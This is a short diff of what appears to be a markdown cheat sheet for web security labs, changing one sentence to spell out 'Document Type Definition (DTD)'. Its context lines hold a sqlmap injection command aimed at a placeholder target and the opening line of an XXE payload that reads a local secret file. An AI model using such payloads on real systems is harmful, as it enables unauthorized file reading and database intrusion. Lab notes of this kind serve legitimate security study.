@@ -738,7 +738,7 @@ sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p 'category' --batch --
 
 ### DTD Hosted Exploit  
 
->On the exploit server host a exploit file with DTD extension, containing the following payload.  
+>On the exploit server host a exploit file with **Document Type Definition (DTD)** extension, containing the following payload.  
 
 ```xml
 <!ENTITY % file SYSTEM "file:///home/carlos/secret">
